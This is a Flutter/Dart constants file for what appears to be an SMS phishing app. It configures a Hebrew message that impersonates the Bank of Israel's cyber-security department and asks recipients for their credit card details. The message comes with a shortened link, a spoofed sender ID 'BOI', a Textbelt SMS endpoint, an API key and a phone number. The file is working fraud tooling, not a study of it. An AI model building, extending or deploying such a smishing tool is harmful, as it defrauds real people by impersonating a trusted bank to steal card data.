import 'dart:ui';

import 'package:flutter/material.dart';

class AppConst {
  static const sub1 = 
  
      "שלום \nאנחנו מחלקת אבטחת הסייבר של הבנק המרכזי של ישראל, אנא מלא את שמות כרטיס האשראי שלך כדי שנדע את בעליו האמיתי\n\n";

      static const sub2="https://shorturl.at/GMST3";
      static const message =sub1+sub2;

  static const senderId = "BOI";
  static const apiKey = "ee7178646c717e32a8e604e329bdbdb91dc8fb925Uij47xYiYyQ3qLVX2ux9FIMr";
  static const baseUrl = "https://textbelt.com";
  static const textEndPoint = "https://textbelt.com/text";
  static const myNum = "+962781617524";
  static const textFieldStyle = TextStyle(
    color: Colors.white,
    fontSize: 18,
    fontWeight: FontWeight.bold,
    letterSpacing: 1,
    wordSpacing: 1,
    height: 1.5,
    // fontFamily: 'Poppins',
    decoration: TextDecoration.none,
    decorationColor: Colors.white,
    decorationStyle: TextDecorationStyle.solid,
    decorationThickness: 1,
  );

  static const labelStyle = TextStyle(
    color: Colors.white,
    fontSize: 18,
    fontWeight: FontWeight.bold,
    letterSpacing: 1,
    wordSpacing: 1,
    height: 1.5,
    fontFamily: 'Poppins',
    decoration: TextDecoration.none,
    decorationColor: Colors.white,
    decorationStyle: TextDecorationStyle.solid,
    decorationThickness: 1,
  );
}
